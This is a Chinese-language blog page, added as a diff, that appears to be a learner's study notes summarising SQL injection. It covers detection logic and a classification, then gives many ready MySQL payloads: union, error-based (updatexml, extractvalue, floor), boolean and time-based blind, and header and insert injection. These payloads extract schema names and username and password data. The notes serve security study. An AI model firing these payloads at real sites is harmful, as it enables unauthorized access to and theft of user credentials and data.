@@ -1,0 +1,1247 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>SQL注入方法总结</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="SQL注入方法总结">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/30e59cf7.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-07-09">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-07-19">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="SQL注入">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      SQL注入方法总结
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-07-09T10:53:53.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-07-09</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          Web渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>4.7k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
+            class="post-meta-link">
+            SQL注入
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>SQL注入学习完毕，按照惯例，进行一波复盘总结，包括探测发现、方法利用。</p>
+<p>大致流程：</p>
+<p>1、判断换是否有注入漏洞，识别注入点类型</p>
+<p>2、获取数据库中的信息</p>
+<p>​            获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
+<p>​            获取数据库库名</p>
+<p>​            获取表名</p>
+<p>​            获取列名</p>
+<p>​            获取用户数据</p>
+<p>3、破解加密数据（数据解密）</p>
+<p>4、提升权限（配合其他漏洞）</p>
+<p>5、内网渗透（配合其他漏洞）</p>
+<h1 id="二、SQL注入产生原因"><a href="#二、SQL注入产生原因" class="headerlink" title="二、SQL注入产生原因"></a>二、SQL注入产生原因</h1><p>1、不当的类型处理</p>
+<p>2、不安全的数据库配置</p>
+<p>3、不合理的查询集处理</p>
+<p>4、不当的错误处理</p>
+<p>5、转义字符处理不合适</p>
+<p>6、多个提交处理不当</p>
+<h1 id="三、SQL注入利用前提"><a href="#三、SQL注入利用前提" class="headerlink" title="三、SQL注入利用前提"></a>三、SQL注入利用前提</h1><p>1、用户能控制输入的内容</p>
+<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
+<h1 id="四、SQL注入探测与利用（内含思路）"><a href="#四、SQL注入探测与利用（内含思路）" class="headerlink" title="四、SQL注入探测与利用（内含思路）"></a>四、SQL注入探测与利用（内含思路）</h1><p>前面硬邦邦的含义介绍完毕，开始本文干货内容。</p>
+<h2 id="1、分类"><a href="#1、分类" class="headerlink" title="1、分类"></a>1、分类</h2><p>在探测前，要了解SQL注入的分类，方便理解。</p>
+<table>
+<thead>
+<tr>
+<th>分类方式</th>
+<th>类型</th>
+<th>判断分类意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>根据请求方式分类</td>
+<td>GET请求注入<br>POST请求注入</td>
+<td>调整注入使用的工具</td>
+</tr>
+<tr>
+<td>根据注入点参数分类</td>
+<td>字符型注入<br>整数型注入<br>搜索型注入</td>
+<td>判断闭合符号</td>
+</tr>
+<tr>
+<td>根据页面反馈结果分类</td>
+<td>union注入<br>报错注入<br>布尔盲注<br>时间延时盲注<br>其他类型</td>
+<td>调整注入手法</td>
+</tr>
+<tr>
+<td>根据数据库类型分类</td>
+<td>MySQL注入<br>SQLServer注入<br>Oracle注入<br>Access注入</td>
+<td>调整注入语句</td>
+</tr>
+<tr>
+<td>其他类型</td>
+<td>请求头注入<br>内联注入<br>宽字节注入<br>二次编码注入<br>堆叠注入<br>二阶注入</td>
+<td>特殊情况特殊对待</td>
+</tr>
+</tbody></table>
+<h2 id="2、探测"><a href="#2、探测" class="headerlink" title="2、探测"></a>2、探测</h2><p>标题三中介绍过，用户能控制输入内容的地方+内容被代入数据库执行（增、查等）多可能存在SQL注入，也是我们需要进行探测的地方。具体点来说，就是url、搜索框、数据包中的数据（可能会被代入数据库的部分，如UA、XFF、POST参数等）。</p>
+<p><strong>下面是全文精华所在！思路汇总</strong></p>
+<pre class="highlight"><span class="line">使用&#x27;、&quot;、\（单引号双引号斜杠，全加）</span><br><span class="line">页面变化（内容变化、报错等）</span><br><span class="line">	--&gt;使用单个截断符再次判断，若页面返回正常则为字符型注入。（需要用闭合符闭合语句）</span><br><span class="line">	--&gt;页面一直异常，则改为2-1（若原数字为1）,页面返回正常则为整数型注入。（不需要使用闭合符）</span><br><span class="line">	</span><br><span class="line">	再来判断闭合符。（需要结合具体环境分析可能存在的sql语句）</span><br><span class="line">		--&gt;使用让页面异常的符号（\为转义，若有注入必报错，不做判断要求）+若干闭合符（)、%等）+注释符（#、-- ），直至页面返回正		常【注意，#在url中使用需要url编码（%23），--空格使用最好为-- a，避免空格被编码吃掉，空格后可以为任意字符】</span><br><span class="line">		插入：若是在搜索处，需要注意搜索类型，判断基础语句为（%&#x27;and &#x27;%&#x27;=&#x27; 闭合%）</span><br><span class="line">		至此，闭合符判断完毕</span><br><span class="line">	</span><br><span class="line">	使用闭合符+order by 数字+注释符判断数据库列数</span><br><span class="line">		--&gt;二分法判断，使页面正常的最大整数即为数据库列数</span><br><span class="line">		</span><br><span class="line">	尝试注入手法（布尔盲注-union联合查询-报错注入）</span><br><span class="line">	（内联注入-堆叠注入）</span><br><span class="line">	这里为判断尝试优先级</span><br><span class="line">		&gt;&gt;布尔盲注即输入正确时返回数据，不正确时无任何显示。情况较为明显，若有这种情况则有优先进行布尔盲注。</span><br><span class="line">		&gt;&gt;union联合查询为常规手法，需要有显示位。若无显示位再尝试其他方法。</span><br><span class="line">		&gt;&gt;最后是报错注入，使用报错语句手动制造报错信息，多用于页面异常但是不报错的情况。</span><br><span class="line">	其他情况。在上述手法中，可穿插内联注入（使用and、or连接闭合语句，使原来语句依旧执行）、堆叠注入（使用;连接多个语句，全部执	行）【注：内联注入和堆叠注入前提是存在注入】</span><br><span class="line">		</span><br><span class="line">页面无变化（时间延时盲注-宽字节注入-二次编码注入-二阶注入）</span><br><span class="line">	四种方式无书序要求，按照出现概率进行排序</span><br><span class="line">	--&gt;时间延时盲注，利用延时语句判断注入语句是否正确</span><br><span class="line">	--&gt;宽字节注入</span><br><span class="line">	--&gt;二次编码注入</span><br><span class="line">	--&gt;二阶注入通常发生在注册、发表文章等页面，虽然写入的注入语句被防护后写入数据库，但是当再次执行时则会触发。</span><br><span class="line">	--&gt;无注入</span><br><span class="line"></span><br><span class="line">最后还有个文件头注入，这里可以直接对文件头参数进行探测尝试，也可以使用Header Editor插件，对User-Agent、X-Forwarded-For进行编辑，在其后加入判断符，并保持插件开启状态，当存在注入时，自动触发异常。（遇到无变化的情况仍需手测，这里只针对可能被存入数据库的参数进行测试）</span><br></pre>
+
+
+
+<h2 id="五、数据库常用语句"><a href="#五、数据库常用语句" class="headerlink" title="五、数据库常用语句"></a>五、数据库常用语句</h2><p>核心查询语句，万变不离其宗</p>
+<p>常用命令</p>
+<pre class="highlight"><span class="line">show databases;					#显示所有数据库</span><br><span class="line">use dbname;						#选定数默认数据库</span><br><span class="line">show tables;					#显示默认数据库中所有表</span><br><span class="line"></span><br><span class="line">create database db_test;		#创建数据库</span><br><span class="line">use db_test;					#选定数据库</span><br><span class="line">create table tb_test();			#创建表</span><br><span class="line">CREATE TABLE tb_news(</span><br><span class="line">	id INT(10) UNSIGNED UNIQUE AUTO_INCREMENT,</span><br><span class="line">	title VARCHAR(100) NOT NULL,</span><br><span class="line">	author VARCHAR(20) NOT NULL,</span><br><span class="line">	content TEXT NOT NULL,</span><br><span class="line">	addtime TIMESTAMP,</span><br><span class="line">	PRIMARY KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE tb_users(</span><br><span class="line">	id INT(10) UNSIGNED AUTO_INCREMENT,</span><br><span class="line">	uname VARCHAR(20) NOT NULL,</span><br><span class="line">	upass VARCHAR(50) NOT NULL,</span><br><span class="line">	activeSrc VARCHAR(100) DEFAULT &#x27;image/default.jpg&#x27;,</span><br><span class="line">	email VARCHAR(50) NOT NULL,</span><br><span class="line">	addtime TIMESTAMP,</span><br><span class="line">	PRIMARY KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">UNIQUE 值唯一</span><br><span class="line">id属性固定（设置自增长）</span><br><span class="line">KEY属性固定（设定ID为主键）</span><br><span class="line">desc tb_test;						#查看表内容</span><br><span class="line"></span><br><span class="line">insert INTO tb_test (字段) VALUE (&#x27;内容&#x27;);			#新增字段，键值一一对应</span><br><span class="line">insert INTO tb_test (author,title,content) VALUES (&#x27;zs&#x27;,&#x27;title1&#x27;,&#x27;dasdasadadadad&#x27;);</span><br><span class="line"></span><br><span class="line">select * from tb_test where xx;				#查询数据 </span><br><span class="line">* 可替换为指定键</span><br><span class="line">where限定查询范围，查询表达式运算从前往后</span><br><span class="line">xx可以为：&gt;、&lt;、=、like</span><br><span class="line">分别对应数值匹配和字符串匹配，like搭配%使用（%n查询以n结尾的数据）</span><br><span class="line">select * from tb_news where content like &#x27;%n%&#x27;    		#搜索content中包含n的内容</span><br><span class="line">select * from tb_news where addtime &gt; &#x27;2021-06-23 16:48:46&#x27; and (content like &#x27;%8%&#x27; or id &lt; 16);</span><br><span class="line">#搜索范围使用and连接，标识并列，or连接表示或者</span><br><span class="line"></span><br><span class="line">delete										#删除</span><br><span class="line">delete from tb_news;        				#删除表格全部数据</span><br><span class="line">delete from tb_news where id =18;        	#最小删除单位为行    查询限制条件同select</span><br><span class="line"></span><br><span class="line">update										#修改数据</span><br><span class="line">update tb_news set author = &#x27;zs&#x27;, title = &#x27;hello&#x27;;        			#修改全部数据</span><br><span class="line">update tb_news set author = &#x27;zs&#x27;, title = &#x27;hello&#x27; where id=2;    	#修改id=2的指定数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alter table 表名 action								#修改表结构</span><br><span class="line">action可以为：</span><br><span class="line">add 列名 建表语句 [first|afer 列名]  					#为表添加一列，默认列尾添加</span><br><span class="line">add primary key(列名)   								#为表添加主键，已存在主键则报错</span><br><span class="line">modify 列名 &lt;建表语句&gt; [first|after 列名]  			  	#更改列类型和列名称</span><br><span class="line">drop 												#列名   删除一列</span><br><span class="line">rename as 											#新表名    更改表名</span><br><span class="line"></span><br></pre>
+
+
+
+<h1 id="六、详细方法"><a href="#六、详细方法" class="headerlink" title="六、详细方法"></a>六、详细方法</h1><p>数据库常用函数</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>数据库版本号</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>当前数据库</td>
+</tr>
+<tr>
+<td>user()</td>
+<td>当前用户</td>
+</tr>
+<tr>
+<td>current_user()</td>
+<td>当前用户名</td>
+</tr>
+<tr>
+<td>system_user()</td>
+<td>系统用户名</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库路径</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>limit</td>
+<td>限制查询数量，下标从0开始  limit  0,2 从0开始查两个</td>
+</tr>
+<tr>
+<td>length()</td>
+<td>计算数据长度</td>
+</tr>
+<tr>
+<td>count()</td>
+<td>计算数据行数</td>
+</tr>
+<tr>
+<td>mid(str,1,30)</td>
+<td>截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
+</tr>
+<tr>
+<td>substr(str,0,30)</td>
+<td>0为截取初始位，包含整个查询语句</td>
+</tr>
+<tr>
+<td>ascii()</td>
+<td>转为ascii码</td>
+</tr>
+</tbody></table>
+<h2 id="1、union联合查询"><a href="#1、union联合查询" class="headerlink" title="1、union联合查询"></a>1、union联合查询</h2><p>判断数据库列数</p>
+<p>order by + 数字</p>
+<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
+<p>‘ order by 5#</p>
+<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
+<p>然后使用union select联合查,寻找显示位：</p>
+<p>id = -2 union select 1,2,3,4；</p>
+<p>数据库信息查询</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查库名</td>
+<td>-1 union select 1,2,database()– a  推荐<br>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</td>
+</tr>
+<tr>
+<td>查表名</td>
+<td>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=’数据库名’)– a</td>
+</tr>
+<tr>
+<td>查字段</td>
+<td>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=’数据库名’ and table_name=’表名’)– a</td>
+</tr>
+<tr>
+<td>查数据</td>
+<td>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)– a</td>
+</tr>
+</tbody></table>
+<p>注意：</p>
+<p>1、union select查询列数要与前面列数相同</p>
+<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
+<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
+<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
+<h2 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h2><pre class="highlight"><span class="line">updatexml(arg1,arg2,arg3)  				#查询符合条件的数据	</span><br><span class="line">and updatexml(1,concat(0x5e,(select user()),0x5e),1)</span><br><span class="line">XPATH路径报错	mysql5.1.5及以上版本，输出有32位长度限制</span><br><span class="line">0x5e为^的16进制编码，用于绕过斜杠转义，下同</span><br><span class="line"></span><br><span class="line">extractvalue(arg1,arg2)  				 #同上，两个参数	</span><br><span class="line">and extractvalue(1,concat(0x5e,(select user()),0x5e))</span><br><span class="line">XPATH路径报错	mysql5.1及以上版本,输出有32位长度限制</span><br><span class="line"></span><br><span class="line">floor()  								#返回小于等于该值的最大整数（只返回整数部分）	</span><br><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line">floor、count、group by函数冲突报错	mysql5.0及以上版本，user()可变，其他固定</span><br><span class="line"></span><br><span class="line">name_const(name,value) 					#产生一个结果集合列	</span><br><span class="line">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a</span><br><span class="line">列名重复报错	mysql5.0及以下</span><br><span class="line"></span><br><span class="line">exp() 									 #以e为底的指数函数	</span><br><span class="line">and exp(~(select * from (select user()) a))</span><br><span class="line">整形溢出报错	mysql5.5.5及以上版本</span><br><span class="line"></span><br><span class="line">几何函数报错（不满足要求就会报错）	</span><br><span class="line">and multipoint((select * from (select * from (select * from (select version())a)b)c))</span><br><span class="line">geometrycollection()</span><br><span class="line">multipoint()</span><br><span class="line">polygon()</span><br><span class="line">multipolygon()</span><br><span class="line">linestring()</span><br><span class="line">multilinestring()</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">将对应user()等地方替换为要执行的sql语句即可</span><br><span class="line">查数据库名	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1)    推荐</span><br><span class="line">或id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)</span><br><span class="line"></span><br><span class="line">查表名	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#x27;数据库名&#x27;),0x7e),1)</span><br><span class="line"></span><br><span class="line">查字段	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;),0x7e),1)</span><br><span class="line"></span><br><span class="line">查数据	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#x27;数据库名&#x27;.&#x27;表名&#x27;),0x7e),1)</span><br><span class="line"></span><br></pre>
+
+
+
+<h2 id="3、布尔盲注"><a href="#3、布尔盲注" class="headerlink" title="3、布尔盲注"></a>3、布尔盲注</h2><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
+<p>用法：</p>
+<p>ascii码二分法</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>先判断数据长度或个数</td>
+<td>and  length((select database())) &gt; 64</td>
+</tr>
+<tr>
+<td>然后进行二分法匹配</td>
+<td>and  ascii(mid((select database()),1,1)) &gt;64</td>
+</tr>
+</tbody></table>
+<p>语句如下（省略二分法，直接用=号），n均为前一句获取的长度值</p>
+<pre class="highlight"><span class="line">and (length(database()))=8		#获取数据库长度	注意：判断长度不需要转ascii码</span><br><span class="line">	</span><br><span class="line">and ascii((select mid(database(),n,1)))=115 -- a		#获取数据库名</span><br><span class="line"></span><br><span class="line">#获取表长度</span><br><span class="line">and length((select mid((table_name),1,1) from information_schema.tables where table_schema=database()))=30 -- a</span><br><span class="line">	</span><br><span class="line">#获取表名	</span><br><span class="line">and ascii((select mid((table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</span><br><span class="line"></span><br><span class="line">#获取字段长度</span><br><span class="line">and length((select mid((column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;))=30 -- a</span><br><span class="line"></span><br><span class="line">获取字段名	</span><br><span class="line">and ascii((select mid((column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;))=30 -- a</span><br><span class="line"></span><br><span class="line">and length((select mid((username,password),1,1) from database().&#x27;表名&#x27;))=30 -- a		#获取数据长度	</span><br><span class="line"></span><br><span class="line">and ascii((select mid((username,password),1,1) from database().&#x27;表名&#x27;))=30 -- a		#获取字段名	</span><br></pre>
+
+
+
+<h2 id="4、时间延时盲注（单双引号页面无变化）"><a href="#4、时间延时盲注（单双引号页面无变化）" class="headerlink" title="4、时间延时盲注（单双引号页面无变化）"></a>4、时间延时盲注（单双引号页面无变化）</h2><p>基于sql盲注，为升级版本</p>
+<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
+<p>判断：</p>
+<p>‘“%</p>
+<p>‘ and sleep(3) %23</p>
+<p>“ and sleep(3))%23</p>
+<p>…</p>
+<p>方法同判断截断字符</p>
+<p>用法：</p>
+<table>
+<thead>
+<tr>
+<th>判断函数</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>if</td>
+<td>select  if(arg1,arg2,arg3)  <br>arg1：判断条件  arg2：条件为真时执行的语句  arg3：条件为假时执行的语句  <br>常用：  and select  if((length(database())&gt;5),sleep(5),1) –a</td>
+</tr>
+<tr>
+<td>case when</td>
+<td>select case  when arg1 then arg2 else arg3 end;  <br>arg1：判断条件  arg2：条件为真时执行的语句  arg3：条件为假时执行的语句  <br>常用：  and select  case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
+</tr>
+</tbody></table>
+<p>语句如下（省略二分法，直接用=号）</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>获取数据库长度</td>
+<td>and  if((length(database()))=8),sleep(3),1)            #注意：判断长度不需要转ascii码</td>
+</tr>
+<tr>
+<td>获取数据库名</td>
+<td>and  if((ascii((select mid(database(),1,1)))=115),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取表长度</td>
+<td>and  if((length((select mid((table_name),1,1) from information_schema.tables where  table_schema=database()))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取表名</td>
+<td>and  if((ascii((select mid((table_name),1,1) from information_schema.tables where  table_schema=database()))=100),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取字段长度</td>
+<td>and  if((length((select mid((column_name),1,1) from information_schema.columns  where table_schema=database() and table_name=’表名’))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取字段名</td>
+<td>and  if((ascii((select mid((column_name),1,1) from information_schema.columns  where table_schema=database() and table_name=’表名’))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取数据长度</td>
+<td>and  if((length((select mid((username,password),1,1) from database().’表名’))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取字段名</td>
+<td>and  if((ascii((select mid((username,password),1,1) from database().’表名’))=30),sleep(3),1) – a</td>
+</tr>
+</tbody></table>
+<p>sleep可用benchmark代替</p>
+<p>benchmark(arg1,arg2)</p>
+<p>arg1为执行次数，arg2为执行语句</p>
+<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
+<pre class="highlight"><span class="line">benchmark(5000000,md5(123))  		#执行500万次MD5加密  </span><br></pre>
+
+<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
+<h2 id="5、请求头注入"><a href="#5、请求头注入" class="headerlink" title="5、请求头注入"></a>5、请求头注入</h2><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User-Agent</td>
+<td>浏览器版本</td>
+</tr>
+<tr>
+<td>X-Forwarded-For</td>
+<td>获取HTTP请求端的真实IP</td>
+</tr>
+</tbody></table>
+<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
+<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
+<p>报错注入和bool盲注</p>
+<h2 id="6、内联注入"><a href="#6、内联注入" class="headerlink" title="6、内联注入"></a>6、内联注入</h2><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
+<p>找到留言板的显示位，在显示位上进行sql注入。</p>
+<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
+<p>使用</p>
+<p>不用注释，用截断代替，然后使用多个and/or连接</p>
+<p>注：前面为true用and；前面为false用or</p>
+<pre class="highlight"><span class="line">1、&#x27;firefox&#x27; and &#x27; &#x27;        	#补齐</span><br><span class="line"></span><br><span class="line">2、&#x27;firefox&#x27; and payload and &#x27; &#x27;</span><br></pre>
+
+<p>注：内联注入查询多个表的字段时（特别是有相同名称的字段时），可用select as语句优化语法</p>
+<pre class="highlight"><span class="line">1、</span><br><span class="line">SELECT article.title,article.content,user.username FROM article, user</span><br><span class="line">WHERE article.aid=1 AND article.uid=user.uid</span><br><span class="line"></span><br><span class="line">SELECT a.title,a.content,u.username FROM article AS a, user AS u where a.aid=1 and a.uid=u.uid</span><br><span class="line">上述两条语句意思相同，但是select as重命名，简化输入的同时避免歧义</span><br><span class="line"></span><br><span class="line">2、</span><br><span class="line">SELECT userName AS a,userAddress AS b FROM TestTable WHERE a like &#x27;%am%&#x27; </span><br><span class="line">该语句执行是会报错，因为 别名只是对字段的一种引用，不能当作字段一样使用，如果真要把别名当字段一样使用，可以如下变通：</span><br><span class="line">SELECT a, b FROM(SELECT userName AS a,userAddress AS b FROM TestTable) AS tempTable WHERE a like &#x27;%dd%&#x27; </span><br><span class="line">如此，便可把别名当字段一样使用了</span><br><span class="line"></span><br><span class="line">注：as可省略，但不建议</span><br></pre>
+
+
+
